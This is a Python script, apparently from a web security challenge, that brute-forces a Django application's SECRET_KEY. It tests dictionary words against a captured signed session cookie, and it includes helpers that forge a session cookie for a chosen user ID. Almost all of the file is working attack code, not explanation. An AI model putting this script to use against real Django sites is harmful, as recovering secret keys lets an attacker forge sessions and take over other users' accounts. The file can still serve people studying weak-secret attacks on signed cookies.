from django.conf import settings
from django.core import signing
from django.core.signing import *
from django.utils import crypto
import sys 
import time

#python ~/../mysite/manage.py shell
#execfile('brute.py')

# Signing algorithm, equivalent to signing.dumps()
common_salt=force_str("django.core.signing.get_cookie_signer")
sessionid = "eyJ1c2VyIjoiODY0NDU3In0:1YlGx9:TPJDRoQ48cY65lKxVhExR72HNq4"
def sign(obj):
    global common_salt
    data = b64_encode(JSONSerializer().dumps(obj))
    value = force_str(data)
    value = str('%s%s%s') % (value, ':', baseconv.base62.encode(int(time.time())))
    value = force_str(value)
    value = str('%s%s%s') % (value, ':', force_str(base64_hmac(common_salt + 'signer', value, settings.SECRET_KEY)))
    return value

# Unsigning algorithm
def unsign(data):
    global common_salt
    data = force_str(data)
    value, sig = data.rsplit(':', 1)
    if constant_time_compare(sig, force_str(base64_hmac(common_salt + 'signer', value, settings.SECRET_KEY))):
        result = force_text(value)
    else:
        return ''
    # Check timestamp, blah,blah
    value, timestamp = result.rsplit(':', 1)
    value = force_bytes(value)
    data = b64_decode(value)
    return JSONSerializer().loads(data)

def brute():
    global sessionid
    for key in open('/home/chesley/Dropbox/tmp/web-d/dictionary.txt').readlines():
        settings.SECRET_KEY = key.strip()
        print "'%s'" % (settings.SECRET_KEY)
        try:
            #a = get_cookie_signer().unsign(sessionid)
            a = loads(sessionid, key=b'django.http.cookies'+settings.SECRET_KEY, salt=common_salt)

            print "Possible secret key: " + key.strip()
            with open('/home/chesley/Dropbox/tmp/web-d/brute.out', 'a') as f:
                f.write(key.strip())
                sys.exit(0)
        except BadSignature, e:
            pass

def brute_unsign(data):
    global common_salt
    keys = open('/home/chesley/Dropbox/tmp/web-d/dictionary.txt').readlines()[0:1000]
    data = force_str(data)
    value, sig = data.rsplit(':', 1)
    print value, sig
    for key in keys:
        key = key.strip()
        print key
        #if sig == force_str(base64_hmac(common_salt + 'signer', value, key)):
        if sig == force_str(base64_hmac(common_salt + 'signer', value, key)):
            result = force_text(value)
            print "MATCH:" + key
            return key

fakesessionid=get_cookie_signer().sign(b64_encode(JSONSerializer().dumps({"user":"864457"})))
print fakesessionid
get_cookie_signer().unsign(fakesessionid)
brute()
